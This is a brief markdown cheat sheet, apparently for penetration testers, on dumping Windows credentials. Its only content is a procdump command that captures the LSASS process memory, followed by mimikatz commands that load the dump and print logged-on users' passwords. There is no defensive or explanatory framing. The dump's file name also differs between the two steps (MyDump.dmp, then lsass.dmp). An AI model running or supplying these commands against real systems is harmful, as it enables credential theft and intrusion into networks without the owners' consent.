# Procdump into mimikatz

```
procdump.exe -accepteula -ma lsass.exe MyDump.dmp
```

Into mimikatz launched with adm rights:

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```


